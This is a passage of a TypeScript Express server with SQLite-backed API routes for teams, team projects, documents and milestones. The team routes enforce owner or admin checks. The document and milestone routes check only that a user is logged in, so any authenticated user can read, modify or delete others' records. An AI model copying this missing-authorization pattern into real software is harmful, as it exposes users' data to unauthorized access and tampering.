    res.json({ success: true, memberId: newMemberId });
  } catch (err: any) {
    if (err.message.includes("UNIQUE constraint failed")) {
      res.status(400).json({ error: "User is already in team" });
    } else {
      res.status(500).json({ error: "Failed to add member" });
    }
  }
});

app.delete("/api/teams/:id/members/:userId", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;

  const team = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  if (!team) return res.sendStatus(404);

  if (req.user.role !== "admin" && team.ownerId !== req.user.id && req.user.id !== req.params.userId) {
    return res.status(403).json({ error: "Only admins or the team owner can remove members." });
  }

  await db.run("DELETE FROM team_members WHERE teamId = ? AND userId = ?", [req.params.id, req.params.userId]);
  res.json({ success: true });
});

app.get("/api/teams/:id/projects", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const projects = await db.all(`
    SELECT p.* 
    FROM projects p
    JOIN team_projects tp ON p.id = tp.projectId
    WHERE tp.teamId = ?
  `, req.params.id);
  res.json(projects);
});

app.post("/api/teams/:id/projects", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;

  const team = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  if (!team) return res.sendStatus(404);

  if (req.user.role !== "admin" && team.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins or the team owner can add projects." });
  }

  try {
    await db.run(
      "INSERT INTO team_projects (teamId, projectId) VALUES (?, ?)",
      [req.params.id, req.body.projectId]
    );
    res.json({ success: true });
  } catch (err: any) {
    if (err.message.includes("UNIQUE constraint failed")) {
      res.status(400).json({ error: "Project is already in team" });
    } else {
      res.status(500).json({ error: "Failed to add project" });
    }
  }
});

app.delete("/api/teams/:id/projects/:projectId", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;

  const team = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  if (!team) return res.sendStatus(404);

  if (req.user.role !== "admin" && team.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins or the team owner can remove projects." });
  }

  await db.run("DELETE FROM team_projects WHERE teamId = ? AND projectId = ?", [req.params.id, req.params.projectId]);
  res.json({ success: true });
});

app.put("/api/teams/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const team = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  if (!team) return res.sendStatus(404);

  if (req.user.role !== "admin" && team.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins and the team owner can edit this team." });
  }

  const { name, description } = req.body;
  await db.run(
    "UPDATE teams SET name = COALESCE(?, name), description = COALESCE(?, description) WHERE id = ?",
    [name, description, req.params.id]
  );
  
  const updatedTeam = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  res.json(updatedTeam);
});

app.delete("/api/teams/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const team = await db.get("SELECT * FROM teams WHERE id = ?", req.params.id);
  if (!team) return res.sendStatus(404);
  
  if (req.user.role !== "admin" && team.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins or the team owner can delete this team." });
  }

  await db.run("DELETE FROM teams WHERE id = ?", req.params.id);
  await db.run("DELETE FROM team_members WHERE teamId = ?", req.params.id);
  res.json({ success: true });
});

// Documents APIs

app.get("/api/projects/:projectId/documents", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const docs = await db.all("SELECT * FROM documents WHERE projectId = ? ORDER BY updatedAt DESC", req.params.projectId);
  res.json(docs);
});

app.post("/api/projects/:projectId/documents", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { title, content } = req.body;
  const id = uuidv4();
  const now = new Date().toISOString();
  
  await db.run(
    "INSERT INTO documents (id, projectId, title, content, authorId, createdAt, updatedAt) VALUES (?, ?, ?, ?, ?, ?, ?)",
    [id, req.params.projectId, title, content || "", req.user.id, now, now]
  );
  
  const doc = await db.get("SELECT * FROM documents WHERE id = ?", id);
  res.json(doc);
});

app.get("/api/documents/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const doc = await db.get("SELECT * FROM documents WHERE id = ?", req.params.id);
  if (!doc) return res.sendStatus(404);
  res.json(doc);
});

app.put("/api/documents/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { title, content } = req.body;
  const now = new Date().toISOString();
  
  await db.run(
    "UPDATE documents SET title = COALESCE(?, title), content = COALESCE(?, content), updatedAt = ? WHERE id = ?",
    [title, content, now, req.params.id]
  );
  
  const doc = await db.get("SELECT * FROM documents WHERE id = ?", req.params.id);
  res.json(doc);
});

app.delete("/api/documents/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  await db.run("DELETE FROM documents WHERE id = ?", req.params.id);
  res.json({ success: true });
});

// Milestones APIs

app.get("/api/projects/:projectId/milestones", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const milestones = await db.all("SELECT * FROM milestones WHERE projectId = ? ORDER BY startDate ASC", req.params.projectId);
  res.json(milestones);
});

app.post("/api/projects/:projectId/milestones", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { name, description, startDate, endDate, status } = req.body;
  const id = uuidv4();
  const now = new Date().toISOString();
  
  await db.run(
    "INSERT INTO milestones (id, projectId, name, description, startDate, endDate, status, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
    [id, req.params.projectId, name, description, startDate, endDate, status || "pending", now]
  );
  
  const milestone = await db.get("SELECT * FROM milestones WHERE id = ?", id);
  res.json(milestone);
});

app.put("/api/milestones/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { name, description, startDate, endDate, status } = req.body;
  
  await db.run(
    "UPDATE milestones SET name = COALESCE(?, name), description = COALESCE(?, description), startDate = COALESCE(?, startDate), endDate = COALESCE(?, endDate), status = COALESCE(?, status) WHERE id = ?",
    [name, description, startDate, endDate, status, req.params.id]
  );
  
  const milestone = await db.get("SELECT * FROM milestones WHERE id = ?", req.params.id);
  res.json(milestone);
});

app.delete("/api/milestones/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  await db.run("DELETE FROM milestones WHERE id = ?", req.params.id);
  res.json({ success: true });
});

// Vite middleware for development

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
